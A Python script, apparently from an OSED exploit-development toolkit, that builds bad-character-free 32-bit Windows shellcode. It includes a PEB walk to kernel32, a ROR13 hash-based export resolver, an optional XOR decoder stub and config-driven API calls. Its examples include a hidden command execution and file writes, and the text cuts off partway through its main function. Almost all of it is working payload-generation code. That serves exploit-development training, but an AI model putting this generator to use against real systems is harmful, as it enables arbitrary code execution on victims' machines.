#!/usr/bin/env python3
"""sc_builder.py from osed-windbg: config-driven 32-bit Windows shellcode.

Edit the CONFIG block below, one line per API call, then run:  python sc_builder.py
Needs Python 3 and keystone-engine (pip install keystone-engine).
capstone (pip install capstone) is optional; when present the result is disassembled.

The builder hashes every API with ROR13, writes the assembly (PEB walk to kernel32,
an export resolver, LoadLibraryA for other DLLs, one cached address per API, the
calls, the exit), assembles it line by line, reports every bad byte with its offset
and line, writes shellcode.bin and prints the bytes as a Python literal.
Exit code 1 means a check failed.
"""
import collections
import itertools
import re
import sys

Arg = collections.namedtuple("Arg", "kind value")


def s(text):
    """ANSI string pushed on the stack; the argument is its address."""
    return Arg("s", text)


def w(text):
    """UTF-16LE string pushed on the stack, for W APIs; the argument is its address."""
    return Arg("w", text)


def ref(n):
    """Return value (EAX) of call number n in CALLS, counted from 1."""
    return Arg("ref", n)


class Buffer:
    """One scratch area in the frame, below the slots and not zeroed.

    Every buf() call makes its own, so a buffer bound to a name is one address at every
    call that takes it, and an inline buf() is space nothing else touches.
    """

    count = 0

    def __init__(self, size):
        Buffer.count += 1
        self.number = Buffer.count
        self.size = size

    def __repr__(self):
        return f"buf({self.size}) #{self.number}"


def buf(size):
    """Address of `size` bytes of scratch space below EBP (not zeroed), for out-parameters."""
    return Arg("buf", Buffer(size))


def base(dll):
    """Base address of a DLL: kernel32.dll, or one the builder loads with LoadLibraryA."""
    return Arg("base", dll)


_RECORDED = []
_MARKED_CDECL = set()
CALLS = _RECORDED


class _Export:
    """One export of one DLL.

    Calling it records a stdcall call, the Win32 default, where the API drops its own
    arguments. Calling .cdecl records one the caller cleans up after instead.
    """

    def __init__(self, dll, api):
        self._dll = dll
        self._api = api

    def __call__(self, *args):
        _RECORDED.append((self._dll, self._api, list(args)))
        return Arg("ref", len(_RECORDED))

    def cdecl(self, *args):
        _MARKED_CDECL.add(self._api)
        return self(*args)


class _Dll:
    """Records calls to one DLL: each call returns its own result handle."""

    def __init__(self, name):
        self._name = name

    def __getattr__(self, api):
        if api.startswith("_"):
            raise AttributeError(api)
        return _Export(self._name, api)


def dll(name):
    """Recorder for one DLL, for example dll("user32.dll").MessageBoxA(...)."""
    return _Dll(name)


k32 = dll("kernel32.dll")

# Win32 constants, under their MSDN names, for use as call arguments.
NULL = 0
GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
FILE_SHARE_READ = 0x00000001
FILE_SHARE_WRITE = 0x00000002
CREATE_NEW = 1
CREATE_ALWAYS = 2
OPEN_EXISTING = 3
OPEN_ALWAYS = 4
TRUNCATE_EXISTING = 5
FILE_ATTRIBUTE_NORMAL = 0x80
SW_HIDE = 0
SW_SHOWNORMAL = 1
SW_SHOW = 5
MB_OK = 0
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READWRITE = 0x40

# ==============================================================================
# CONFIG: the only part you edit.
#
# BADCHARS     Bytes the output may not contain. 00 is always added.
# MAX_SIZE     None, or the most bytes the shellcode may take.
# EXIT         "terminate" = TerminateProcess(-1, 0), "exit" = ExitProcess(0),
#              "ret" = restore the registers and return to the caller.
# XOR_ENCODER  True prepends a XOR decoder stub, as plan B when a bad byte remains.
#              The stub decodes in place, so the shellcode page must be writable.
#
# Write one call per line, in execution order. k32 is kernel32.dll:
#
#   k32.WinExec(s("calc.exe"), SW_SHOWNORMAL)
#
# For any other DLL use dll("name"). The builder loads it once with LoadLibraryA:
#
#   dll("user32.dll").MessageBoxA(NULL, s("text"), s("caption"), MB_OK)
#
# Export names are case-sensitive. Arguments go in prototype order and the builder
# pushes them in reverse. An argument is an int, one of the Win32 constants above,
# s("text"), w("text"), buf(size), base("dll"), or the result of an earlier call.
#
# A call returns its result, the value the API leaves in EAX. Give it a name to
# pass it to a later call:
#
#   handle = k32.CreateFileA(...)
#   k32.WriteFile(handle, ...)
#
# The name holds the call's position, captured when the call ran. Inserting
# another call above it cannot move it.
#
# Example 1: run a command, then end the process.
#   k32.WinExec(s("cmd.exe /c whoami > C:\\Users\\Public\\w.txt"), SW_HIDE)
#   EXIT = "terminate"
#
# Example 2: a message box. user32.dll is loaded with LoadLibraryA first.
#   dll("user32.dll").MessageBoxA(NULL, s("Hello from sc_builder"), s("OSED"), MB_OK)
#   EXIT = "exit"
#
# Example 3: write a file. buf(4) receives the count WriteFile writes back.
#   handle = k32.CreateFileA(s("C:\\Users\\Public\\out.txt"), GENERIC_WRITE, 0, NULL,
#                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)
#   k32.WriteFile(handle, s("hello"), 5, buf(4), NULL)
#   k32.CloseHandle(handle)
#   EXIT = "ret"
#
# The older form still works: a literal CALLS = [(dll, api, [args])] list, with
# ref(n) for the result of call n, counted from 1. Use one form or the other. A
# CONFIG block that holds both fails to build.
# ==============================================================================
# >>> CONFIG
BADCHARS = b"\x00"
MAX_SIZE = None
EXIT = "terminate"
XOR_ENCODER = False

k32.WinExec(s("calc.exe"), SW_SHOWNORMAL)
# <<< CONFIG
# Nothing below needs editing.

# A CONFIG block written before these knobs existed still builds.
CDECL = globals().get("CDECL", ())

try:
    from keystone import Ks, KS_ARCH_X86, KS_MODE_32
except ImportError:
    sys.exit("[-] keystone is missing: pip install keystone-engine")

M32 = 0xFFFFFFFF
KS = Ks(KS_ARCH_X86, KS_MODE_32)
BAD = frozenset(BADCHARS) | {0}
KERNEL32 = "kernel32.dll"
EXIT_APIS = {"terminate": "TerminateProcess", "exit": "ExitProcess"}

# Exports the caller cleans up after. Win32 is stdcall, so these are the exceptions:
# the varargs formatters, which cannot know their own argument count, and the C runtime
# in msvcrt.dll and ntdll.dll, which is cdecl throughout. CDECL in CONFIG adds to this.
CDECL_EXPORTS = frozenset({
    "wsprintfA", "wsprintfW",
    "sprintf", "swprintf", "_snprintf", "_snwprintf", "_vsnprintf", "_vsnwprintf",
    "printf", "sscanf", "swscanf",
    "memcpy", "memmove", "memset", "strcpy", "strcat", "strlen", "strcmp",
    "wcscpy", "wcscat", "wcslen",
    "malloc", "free", "atoi", "_itoa", "system", "exit",
})
LABEL = re.compile(r"^([A-Za-z_][A-Za-z0-9_]*):$")


class BuildError(Exception):
    pass


Op = collections.namedtuple("Op", "asm note")
Op.__new__.__defaults__ = ("",)


def comment(text):
    return Op("", text)


def is_label(op):
    return bool(LABEL.match(op.asm))


def ror13(name):
    value = 0
    for char in name.encode("ascii"):
        value = ((value >> 13) | (value << 19)) & M32
        value = (value + char) & M32
    return value


_encodings = {}


def enc(asm):
    """Bytes of one label-free instruction assembled at offset 0."""
    if asm not in _encodings:
        encoding, _ = KS.asm(asm, 0)
        _encodings[asm] = bytes(encoding or b"")
    return _encodings[asm]


def clean(ops):
    return all(not BAD.intersection(enc(op.asm)) for op in ops)


def length(ops):
    return sum(len(enc(op.asm)) for op in ops)


def noted(ops, note):
    return ops[:-1] + [ops[-1]._replace(note=note)]


def describe(data):
    return '"' + "".join("\\0" if b == 0 else chr(b) if 0x20 <= b <= 0x7E else f"\\x{b:02x}" for b in data) + '"'


def frame_operand(disp):
    return f"dword ptr [ebp{'-' if disp < 0 else '+'}0x{abs(disp):02x}]"


# ---------------------------------------------------------------- constants

def xor_key(value):
    """Per-byte key so that key and value ^ key are both clean, or None."""
    key = 0
    for shift in (0, 8, 16, 24):
        byte = (value >> shift) & 0xFF
        k = next((k for k in range(1, 256) if k not in BAD and (byte ^ k) not in BAD), None)
        if k is None:
            return None
        key |= k << shift
    return key


LOW = {"eax": ("al", "ax"), "ecx": ("cl", "cx"), "edx": ("dl", "dx"), "ebx": ("bl", "bx")}


def load_forms(value, reg):
    """Short ways to put `value` in `reg`; the add/sub splits come from split_forms."""
    v = value & M32
    signed = v - (1 << 32) if v & 0x80000000 else v
    zero = Op(f"xor {reg}, {reg}")
    forms = []
    if v == 0:
        forms += [[zero], [Op(f"sub {reg}, {reg}")]]
    for n in (1, 2, 3):
        if v == n:
            forms.append([zero] + [Op(f"inc {reg}")] * n)
        if signed == -n:
            forms.append([zero] + [Op(f"dec {reg}")] * n)
    if -128 <= signed <= 127:
        forms.append([Op(f"push {hex(v)}"), Op(f"pop {reg}")])
    if reg in LOW and 0 < v <= 0xFFFF:
        forms.append([zero, Op(f"mov {LOW[reg][0 if v <= 0xFF else 1]}, {hex(v)}")])
    forms.append([Op(f"mov {reg}, {hex(v)}")])
    key = xor_key(v)
    if key is not None:
        forms.append([Op(f"mov {reg}, {hex(v ^ key)}"), Op(f"xor {reg}, {hex(key)}")])
    forms.append([Op(f"mov {reg}, {hex(~v & M32)}"), Op(f"not {reg}")])
    forms.append([Op(f"mov {reg}, {hex(-v & M32)}"), Op(f"neg {reg}")])
    return forms


def split_forms(value, reg):
    v = value & M32
    for byte in range(1, 256):
        k = byte * 0x01010101
        yield [Op(f"mov {reg}, {hex((v - k) & M32)}"), Op(f"add {reg}, {hex(k)}")]
        yield [Op(f"mov {reg}, {hex((v + k) & M32)}"), Op(f"sub {reg}, {hex(k)}")]


def shortest_clean(forms):
    usable = [form for form in forms if clean(form)]
    return min(usable, key=length) if usable else None


def load_const(value, reg, note):
    """Shortest clean sequence that leaves `value` in `reg`."""
    form = shortest_clean(load_forms(value, reg)) or next((f for f in split_forms(value, reg) if clean(f)), None)
    if form is None:
        raise BuildError(f"no clean way to load {hex(value & M32)} into {reg} ({note})")
    return noted(form, note)


def push_const(value, note, reg="eax"):
    """Shortest clean sequence that pushes `value`: push imm, or a load into `reg` and push."""
    v = value & M32
    pushed = Op(f"push {reg}")
    forms = [[Op(f"push {hex(v)}")]] + [form + [pushed] for form in load_forms(v, reg)]
    form = shortest_clean(forms) or next((f + [pushed] for f in split_forms(v, reg) if clean(f + [pushed])), None)
    if form is None:
        raise BuildError(f"no clean way to push {hex(v)} ({note})")
    return noted(form, note)


def drop_args(count, note):
    """Caller-side cleanup after a cdecl call: the shortest clean way off those pushes.

    ECX and EDX are free here. The resolver preserves them, but a called API may not,
    so nothing in the generated code reads them across a call.
    """
    total = 4 * count
    forms = [[Op(f"add esp, {hex(total)}")],
             [Op(f"sub esp, {hex(-total & M32)}")],
             [Op(f"lea esp, [esp+{hex(total)}]")]]
    forms += [[Op(f"pop {register}")] * count for register in ("ecx", "edx")]
    form = shortest_clean(forms)
    if form is None:
        raise BuildError(f"no clean way to drop {total} bytes of cdecl arguments ({note})")
    return noted(form, note)


def push_dword_of_text(value, note):
    """A string dword: push it as is, else XOR with a clean key, else the shortest other form.

    XOR comes first because each key byte is picked on its own, so it survives almost
    any bad-char set; an all-zero dword goes to the shorter xor reg, reg form.
    """
    direct = [Op(f"push {hex(value)}")]
    if clean(direct):
        return noted(direct, note)
    if value == 0:
        return push_const(value, note)
    key = xor_key(value)
    if key is not None:
        form = [Op(f"mov eax, {hex(value ^ key)}"), Op(f"xor eax, {hex(key)}"), Op("push eax")]
        if clean(form):
            return noted(form, note + f" (xor key {hex(key)})")
    return push_const(value, note)


def push_text(data):
    """Push `data` (already NUL-terminated) last dword first, so ESP ends up pointing at it."""
    padded = data + b"\x00" * (-len(data) % 4)
    ops = []
    for offset in range(len(padded) - 4, -1, -4):
        chunk = padded[offset:offset + 4]
        ops += push_dword_of_text(int.from_bytes(chunk, "little"), describe(chunk))
    return ops


# ---------------------------------------------------------------- the frame

class Frame:
    """Dword slots in [ebp-0x80, ebp) and scratch buffers below them."""

    def __init__(self):
        self.slots = {}
        self.buffers = {}
        self.next_disp = -4
        self.buffer_end = 0x80

    def slot(self, name):
        if name not in self.slots:
            while (self.next_disp & 0xFF) in BAD:
                self.next_disp -= 4
            if self.next_disp < -0x80:
                raise BuildError("more frame slots than fit in [ebp-0x80, ebp)")
            self.slots[name] = self.next_disp
            self.next_disp -= 4
        return frame_operand(self.slots[name])

    def buffer(self, handle):
        """The offset of one buf() result, allocated the first time it is used."""
        if handle.number not in self.buffers:
            self.buffer_end += (handle.size + 3) & ~3
            self.buffers[handle.number] = self.buffer_end
        return self.buffers[handle.number]

    def reserve(self):
        """Move esp below every slot and buffer: `add esp, -n` when clean, else n through eax."""
        low = max(self.buffer_end + 0x40, 0x100)
        for n in range(low, 0x10000, 4):
            for op in (Op(f"add esp, {hex(-n & M32)}"), Op(f"sub esp, {hex(n)}")):
                if clean([op]):
                    return [op._replace(note=f"esp = ebp - {hex(n)}, below every slot and buffer")]
        return load_const(low, "eax", f"eax = {hex(low)}") + [Op("sub esp, eax", f"esp = ebp - {hex(low)}, below every slot and buffer")]


# ---------------------------------------------------------------- fixed code

Roles = collections.namedtuple("Roles", "base counter hash exports")
Roles.__doc__ = """Which register fills each role in the PEB walk and the resolver.

EAX and ESI never move. EAX is the resolver's return value and the destination lodsb
writes, ESI is the address lodsb reads. The four roles here take the four registers
left over, in whichever order keeps the code clean: a role decided up front can plant
a bad char in a ModRM byte, as mov ebx, [esp+0x18] does with its 8b 5c 24 18.
"""

ROLE_REGISTERS = ("ebx", "ecx", "edx", "edi")


def role_assignments():
    """Every way to fill the four roles. The first is the one the course uses."""
    return (Roles(*order) for order in itertools.permutations(ROLE_REGISTERS))


def find_kernel32(frame, roles):
    return [
        comment("kernel32 base: TEB -> PEB -> loader data -> modules in initialization order."),
        Op("xor eax, eax"),
        Op("mov eax, dword ptr fs:[eax+0x30]", "PEB; a register base keeps 00 bytes out of the address"),
        Op("mov eax, dword ptr [eax+0x0c]", "PEB_LDR_DATA"),
        Op("mov esi, dword ptr [eax+0x1c]", "first InInitializationOrderModuleList link"),
        Op("k32_next:"),
        Op(f"mov {roles.base}, dword ptr [esi+0x08]", "DllBase of this entry"),
        Op(f"lea {roles.exports}, [esi+0x1c]", "-> BaseDllName"),
        Op("mov esi, dword ptr [esi]", "advance now, the checks below use the base and the name"),
        Op(f"cmp word ptr [{roles.exports}], 0x18", "Length 0x18 = 12 UTF-16 chars, as in kernel32.dll"),
        Op("jne k32_next"),
        Op(f"mov {roles.exports}, dword ptr [{roles.exports}+0x04]", "BaseDllName.Buffer"),
        Op(f"mov al, byte ptr [{roles.exports}]"),
        Op("and al, 0xdf", "upper case"),
        Op("cmp al, 0x4b", "'K' rules out other 12-char names"),
        Op("jne k32_next"),
        Op(f"mov {frame.slot('kernel32.dll')}, {roles.base}", "kernel32 base"),
    ]


def resolver(frame, roles):
    # jecxz is the shortest zero test, so the search prefers ecx for the counter and only
    # spends the extra two bytes on test/jz when ecx would carry a bad char.
    at_end = [Op("jecxz rh_none")] if roles.counter == "ecx" else [
        Op(f"test {roles.counter}, {roles.counter}"), Op("jz rh_none")]
    return [
        comment("Store the resolver address: a backward call pushes it without 00 bytes in the rel32."),
        Op("jmp res_call"),
        Op("res_pop:"),
        Op("pop esi", "esi = resolve_hash"),
        Op(f"mov {frame.slot('resolver')}, esi", "resolver"),
        Op("jmp main"),
        Op("res_call:"),
        Op("call res_pop"),
        comment("resolve_hash(module_base, hash) -> eax = export address, 0 when no name matches."),
        comment("It pops both arguments and keeps every register but eax."),
        Op("resolve_hash:"),
        Op("push ebx"),
        Op("push ecx"),
        Op("push edx"),
        Op("push esi"),
        Op("push edi"),
        Op(f"mov {roles.base}, dword ptr [esp+0x18]", "module base (5 saved registers + return address above it)"),
        Op(f"mov eax, dword ptr [{roles.base}+0x3c]", "e_lfanew"),
        Op(f"mov {roles.exports}, dword ptr [{roles.base}+eax+0x78]", "export directory RVA"),
        Op(f"lea {roles.exports}, [{roles.base}+{roles.exports}+0x18]", "-> NumberOfNames; the next three fields follow at +4, +8, +0xc"),
        Op(f"mov {roles.counter}, dword ptr [{roles.exports}]", "NumberOfNames, walked from the last name down"),
        Op("rh_scan:"),
        *at_end,
        Op(f"dec {roles.counter}"),
        Op(f"mov esi, dword ptr [{roles.exports}+0x08]", "AddressOfNames"),
        Op(f"add esi, {roles.base}"),
        Op(f"mov esi, dword ptr [esi+{roles.counter}*4]", "name RVA"),
        Op(f"add esi, {roles.base}"),
        Op(f"xor {roles.hash}, {roles.hash}", "running hash"),
        Op("xor eax, eax"),
        Op("rh_char:"),
        Op("lodsb"),
        Op("test al, al"),
        Op("jz rh_hashed"),
        Op(f"rol {roles.hash}, 0x13", "same as ror 13; the 0x0d count byte is a common bad char"),
        Op(f"add {roles.hash}, eax"),
        Op("jmp rh_char"),
        Op("rh_hashed:"),
        Op(f"cmp {roles.hash}, dword ptr [esp+0x1c]", "wanted hash"),
        Op("jne rh_scan"),
        Op(f"mov esi, dword ptr [{roles.exports}+0x0c]", "AddressOfNameOrdinals"),
        Op(f"add esi, {roles.base}"),
        Op(f"movzx {roles.counter}, word ptr [esi+{roles.counter}*2]", "name index -> function index"),
        Op(f"mov esi, dword ptr [{roles.exports}+0x04]", "AddressOfFunctions"),
        Op(f"add esi, {roles.base}"),
        Op(f"mov eax, dword ptr [esi+{roles.counter}*4]", "function RVA"),
        Op(f"add eax, {roles.base}", "function VA"),
        Op("jmp rh_out"),
        Op("rh_none:"),
        Op("xor eax, eax"),
        Op("rh_out:"),
        Op(f"mov {roles.hash}, dword ptr [esp+0x14]", "return address"),
        Op(f"mov dword ptr [esp+0x1c], {roles.hash}", "over the hash slot, so one add drops both arguments"),
        Op("pop edi"),
        Op("pop esi"),
        Op("pop edx"),
        Op("pop ecx"),
        Op("pop ebx"),
        Op("add esp, 0x08", "ret 8 would encode a 00 byte"),
        Op("ret"),
        Op("main:"),
    ]


def choose_roles():
    """The role assignment with the fewest bad bytes in the PEB walk and the resolver, shortest first.

    With the encoder on, the body never runs as written, so fewest wins and the build goes on.
    With it off, nothing can hide a bad byte there and a tie at zero is the only acceptable one.
    """
    ranked = []
    for roles in role_assignments():
        frame = Frame()
        frame.slot("resolver")
        try:
            placed = place(find_kernel32(frame, roles) + resolver(frame, roles))
        except BuildError:
            continue
        hits = sum(1 for _, _, encoding in placed for byte in encoding if byte in BAD)
        ranked.append((hits, sum(len(encoding) for _, _, encoding in placed), roles))
    if not ranked:
        raise BuildError("neither the PEB walk nor the resolver assembles; keystone may be broken")
    hits, _, roles = min(ranked, key=lambda row: row[:2])
    if hits and not XOR_ENCODER:
        raise BuildError("no register assignment keeps the PEB walk and the resolver clear of "
                         + " ".join(f"{b:02x}" for b in sorted(BAD))
                         + f" ({hits} bad byte(s) at best); try XOR_ENCODER = True")
    return roles


# ---------------------------------------------------------------- the plan

Call = collections.namedtuple("Call", "number dll api args cdecl")


def dll_key(dll):
    name = str(dll).strip().lower()
    return name if name.endswith(".dll") else name + ".dll"


def parse_config():
    """Check CONFIG and return the calls with numbered, normalized entries."""
    if CALLS is not _RECORDED and _RECORDED:
        raise BuildError("CONFIG mixes both call forms. Keep either the literal CALLS list or the recorded k32 and dll() calls")
    if EXIT not in ("terminate", "exit", "ret"):
        raise BuildError(f'EXIT must be "terminate", "exit" or "ret", not {EXIT!r}')
    if MAX_SIZE is not None and (not isinstance(MAX_SIZE, int) or MAX_SIZE <= 0):
        raise BuildError("MAX_SIZE must be None or a positive int")
    if isinstance(CDECL, str):
        raise BuildError('CDECL takes export names, as in CDECL = ("MyPrintf",), not one string')
    cdecl = CDECL_EXPORTS | _MARKED_CDECL | {str(name) for name in CDECL}
    calls = []
    for number, entry in enumerate(CALLS, 1):
        if not (isinstance(entry, tuple) and len(entry) == 3 and isinstance(entry[2], (list, tuple))):
            raise BuildError(f"CALLS entry {number} must be (dll, api, [args]), not {entry!r}")
        dll, api, args = entry
        if not re.match(r"^[A-Za-z_][A-Za-z0-9_]*$", str(api)):
            raise BuildError(f"call {number}: {api!r} is not an export name")
        for arg in args:
            if isinstance(arg, bool) or not isinstance(arg, (int, Arg)):
                raise BuildError(f"call {number} {api}: {arg!r} is not an int, s(), w(), ref(), buf() or base()")
            if isinstance(arg, int) and not -(1 << 31) <= arg <= M32:
                raise BuildError(f"call {number} {api}: {arg} does not fit in a dword")
            if isinstance(arg, Arg) and arg.kind == "ref" and not (isinstance(arg.value, int) and 1 <= arg.value < number):
                raise BuildError(f"call {number} {api}: ref({arg.value!r}) must name an earlier call, 1 to {number - 1}")
            if isinstance(arg, Arg) and arg.kind == "buf" and not (
                    isinstance(arg.value, Buffer) and isinstance(arg.value.size, int)
                    and not isinstance(arg.value.size, bool) and 0 < arg.value.size <= 0x4000):
                raise BuildError(f"call {number} {api}: buf() needs a size from 1 to 0x4000, not {arg.value!r}")
            if isinstance(arg, Arg) and arg.kind == "s":
                try:
                    str(arg.value).encode("latin-1")
                except UnicodeEncodeError:
                    raise BuildError(f"call {number} {api}: s() takes single-byte text, use w() for {arg.value!r}")
        calls.append(Call(number, dll_key(dll), str(api), list(args), str(api) in cdecl))
    return calls


def arg_label(index, arg):
    """How one argument reads in the listing, as the CONFIG line wrote it."""
    if isinstance(arg, int):
        return f"arg{index + 1} = {arg if -10 < arg < 10 else hex(arg)}"
    if arg.kind == "buf":
        return f"arg{index + 1} = {arg.value!r}"
    return f"arg{index + 1} = {arg.kind}({arg.value!r})"


def text_bytes(arg):
    if arg.kind == "s":
        return str(arg.value).encode("latin-1") + b"\x00"
    return str(arg.value).encode("utf-16-le") + b"\x00\x00"


def build_body(calls):
    """The plain shellcode as a list of Op, the (api, dll, hash) table, and the registers chosen."""
    roles = choose_roles()
    frame = Frame()
    frame.slot("resolver")
    exit_api = EXIT_APIS.get(EXIT)
    apis = list(dict.fromkeys([(call.dll, call.api) for call in calls] + ([(KERNEL32, exit_api)] if exit_api else [])))
    dlls = list(dict.fromkeys([dll for dll, _ in apis] + [dll_key(arg.value) for call in calls for arg in call.args
                                                          if isinstance(arg, Arg) and arg.kind == "base"]))
    loaded = [dll for dll in dlls if dll != KERNEL32]
    if loaded and (KERNEL32, "LoadLibraryA") not in apis:
        apis.insert(0, (KERNEL32, "LoadLibraryA"))
    referenced = {arg.value for call in calls for arg in call.args if isinstance(arg, Arg) and arg.kind == "ref"}
    table = [(api, dll, ror13(api)) for dll, api in apis]

    body = [
        comment("Entry: save the caller's registers, open a frame, and move esp below the slots."),
        Op("pushad"),
        Op("mov ebp, esp"),
        None,
    ] + find_kernel32(frame, roles) + resolver(frame, roles)

    body.append(comment("Resolve every API once and keep its address in a frame slot."))

    def resolve(dll, api):
        return push_const(ror13(api), f'ROR13("{api}") = 0x{ror13(api):08x}') + [
            Op(f"push {frame.slot(dll)}", f"{dll} base"),
            Op(f"call {frame.slot('resolver')}", f"eax = {api}"),
            Op(f"mov {frame.slot(dll + '!' + api)}, eax", f"{api} cached"),
        ]

    if loaded:
        body += resolve(KERNEL32, "LoadLibraryA")
    for dll in loaded:
        body.append(comment(f"LoadLibraryA(\"{dll}\"), base cached."))
        body += push_text(dll.encode("latin-1") + b"\x00")
        body += [Op("push esp", f'lpLibFileName -> "{dll}"'),
                 Op(f"call {frame.slot(KERNEL32 + '!LoadLibraryA')}", f"eax = {dll} base"),
                 Op(f"mov {frame.slot(dll)}, eax", f"{dll} base")]
    for dll, api in apis:
        if (dll, api) != (KERNEL32, "LoadLibraryA") or not loaded:
            body += resolve(dll, api)

    for call in calls:
        body.append(comment(f"Call {call.number}: {call.api} from {call.dll}, {len(call.args)} argument(s)."))
        text_slots = {}
        for index, arg in enumerate(call.args):
            if isinstance(arg, Arg) and arg.kind in ("s", "w"):
                data = text_bytes(arg)
                body += push_text(data)
                text_slots[index] = frame.slot(f"text{len(text_slots)}")
                body.append(Op(f"mov {text_slots[index]}, esp", f"-> {describe(data[:-1] if arg.kind == 's' else data[:-2])}"))
        for index in range(len(call.args) - 1, -1, -1):
            arg = call.args[index]
            label = arg_label(index, arg)
            if isinstance(arg, int):
                body += push_const(arg, label)
            elif arg.kind in ("s", "w"):
                body.append(Op(f"push {text_slots[index]}", label))
            elif arg.kind == "ref":
                body.append(Op(f"push {frame.slot(f'ref{arg.value}')}", label))
            elif arg.kind == "base":
                body.append(Op(f"push {frame.slot(dll_key(arg.value))}", label))
            else:
                offset = frame.buffer(arg.value)
                lea = [Op(f"lea eax, [ebp-{hex(offset)}]"), Op("push eax")]
                body += noted(lea if clean(lea) else load_const(-offset, "eax", "") + [Op("add eax, ebp"), Op("push eax")],
                              f"{label}, scratch at ebp-{hex(offset)}")
        body.append(Op(f"call {frame.slot(call.dll + '!' + call.api)}",
                       f"{call.api} is cdecl, so the caller drops the arguments" if call.cdecl
                       else f"{call.api} pops its own arguments"))
        if call.cdecl and call.args:
            body += drop_args(len(call.args), f"drop {len(call.args)} argument(s) of {call.api}")
        if call.number in referenced:
            body.append(Op(f"mov {frame.slot(f'ref{call.number}')}, eax", f"ref({call.number}) = {call.api} result"))

    if EXIT == "terminate":
        body.append(comment("Exit: TerminateProcess(-1, 0) ends the process at once."))
        body += push_const(0, "uExitCode = 0") + push_const(M32, "hProcess = -1, the current process")
        body.append(Op(f"call {frame.slot(KERNEL32 + '!TerminateProcess')}"))
    elif EXIT == "exit":
        body.append(comment("Exit: ExitProcess(0)."))
        body += push_const(0, "uExitCode = 0")
        body.append(Op(f"call {frame.slot(KERNEL32 + '!ExitProcess')}"))
    else:
        body += [comment("Exit: restore the caller's stack and registers and return to it."),
                 Op("mov esp, ebp"), Op("popad"), Op("ret")]
    body[3:4] = frame.reserve()
    return body, table, roles


def place(ops):
    """Assemble each instruction alone at its final offset, so every byte maps back to its line."""
    names = {LABEL.match(op.asm).group(1) for op in ops if is_label(op)}
    labels = {}
    for _ in range(16):
        placed, seen, offset = [], {}, 0
        for op in ops:
            if not op.asm:
                continue
            if is_label(op):
                seen[LABEL.match(op.asm).group(1)] = offset
                continue
            text = re.sub(r"\b[A-Za-z_][A-Za-z0-9_]*\b",
                          lambda m: hex(labels.get(m.group(0), offset)) if m.group(0) in names else m.group(0), op.asm)
            try:
                encoding, _ = KS.asm(text, offset)
            except Exception as error:
                raise BuildError(f"cannot assemble {op.asm!r}: {error}")
            encoding = bytes(encoding or b"")
            placed.append((offset, op, encoding))
            offset += len(encoding)
        if seen == labels:
            return placed
        labels = seen
    raise BuildError("label offsets did not settle")


def xor_stub(code):
    """Decoder that XORs `code` in place and jumps to it, with a key that keeps stub and body clean."""
    for key in range(1, 256):
        if key in BAD or any((byte ^ key) in BAD for byte in code):
            continue
        for pad in range(4):
            ops = [comment("XOR decoder: get the body address with a backward call, decode in place, ret into it."),
                   Op("jmp dec_call"),
                   Op("dec_pop:"),
                   Op("pop esi", "esi = encoded body"),
                   Op("push esi", "the ret below jumps to the decoded body")]
            ops += load_const(len(code), "ecx", f"ecx = {len(code)} bytes to decode")
            ops += [Op("dec_loop:"),
                    Op(f"xor byte ptr [esi], {hex(key)}", "writes over the code: the page must be writable"),
                    Op("inc esi"),
                    Op("loop dec_loop"),
                    Op("ret")]
            ops += [Op("nop", "padding keeps the jmp offset clean")] * pad
            ops += [Op("dec_call:"), Op("call dec_pop", "backward call, so the rel32 has no 00 bytes")]
            placed = place(ops)
            if not any(BAD.intersection(encoding) for _, _, encoding in placed):
                return key, ops, placed
    return None


# ---------------------------------------------------------------- reporting

def line_text(op):
    return op.asm + (f"  ; {op.note}" if op.note else "")


def listing(placed, base_offset=0):
    try:
        from capstone import Cs, CS_ARCH_X86, CS_MODE_32
    except ImportError:
        print("[i] capstone not installed (pip install capstone); listing the assembler input instead")
        for offset, op, encoding in placed:
            print(f"    {base_offset + offset:04x}  {encoding.hex(' '):<24} {line_text(op)}")
        return []
    cs = Cs(CS_ARCH_X86, CS_MODE_32)
    problems = []
    for offset, op, encoding in placed:
        decoded = list(cs.disasm(encoding, base_offset + offset))
        if len(decoded) != 1 or decoded[0].size != len(encoding):
            problems.append(f"capstone does not read {op.asm!r} at 0x{base_offset + offset:04x} as one instruction")
        text = "; ".join(f"{i.mnemonic} {i.op_str}".strip() for i in decoded) or "(undecodable)"
        print(f"    {base_offset + offset:04x}  {encoding.hex(' '):<24} {text:<40}{'  ; ' + op.note if op.note else ''}".rstrip())
    return problems


def bad_bytes(placed, base_offset=0, encoded_with=None):
    """Bad bytes in bytes that reach the transport, after XOR when encoded_with is a key."""
    problems = []
    for offset, op, encoding in placed:
        output = bytes(b ^ encoded_with for b in encoding) if encoded_with is not None else encoding
        for i, byte in enumerate(output):
            if byte in BAD:
                problems.append(f"bad byte 0x{byte:02x} at offset 0x{base_offset + offset + i:04x} in: {line_text(op)}")
    return problems


def forward_calls(placed, base_offset=0):
    """Calls whose rel32 runs forward or holds a 00 byte. The encoder cannot hide these."""
    problems = []
    for offset, op, encoding in placed:
        if encoding[:1] == b"\xe8":
            rel = int.from_bytes(encoding[1:5], "little", signed=True)
            if rel >= 0 or 0 in encoding[1:5]:
                problems.append(f"forward call with rel32 0x{rel & M32:08x} at offset 0x{base_offset + offset:04x}: {op.asm}")
    return problems


def main():
    try:
        calls = parse_config()
        body, table, roles = build_body(calls)
        placed = place(body)
    except BuildError as error:
        print(f"[-] {error}")
        return 1
    plain = b"".join(encoding for _, _, encoding in placed)
    whole, _ = KS.asm("\n".join(op.asm for op in body if op.asm), 0)
    problems = [] if bytes(whole) == plain else ["the per-line map differs from the whole assembly"]

    print(f"[+] {len(calls)} call(s), exit {EXIT}, bad chars {' '.join(f'{b:02x}' for b in sorted(BAD))}")
    print("[+] PEB walk and resolver registers: "
          + ", ".join(f"{role} {register}" for role, register in zip(Roles._fields, roles))
          + ", eax result, esi name cursor")
    print('[+] ROR13 hashes; check one in WinDbg with dx @$osed().sc.hash("<api>", "ROR13")')
    print(f"    {'api':<24} {'dll':<16} hash")
    for api, dll, value in table:
        print(f"    {api:<24} {dll:<16} 0x{value:08x}")

    print(f"[+] code, {len(plain)} bytes:")
    problems += listing(placed)
    problems += forward_calls(placed)
    plain_bad = bad_bytes(placed)
    code = plain
    if not XOR_ENCODER:
        problems += plain_bad
    else:
        stub = xor_stub(plain)
        if stub is None:
            problems += plain_bad
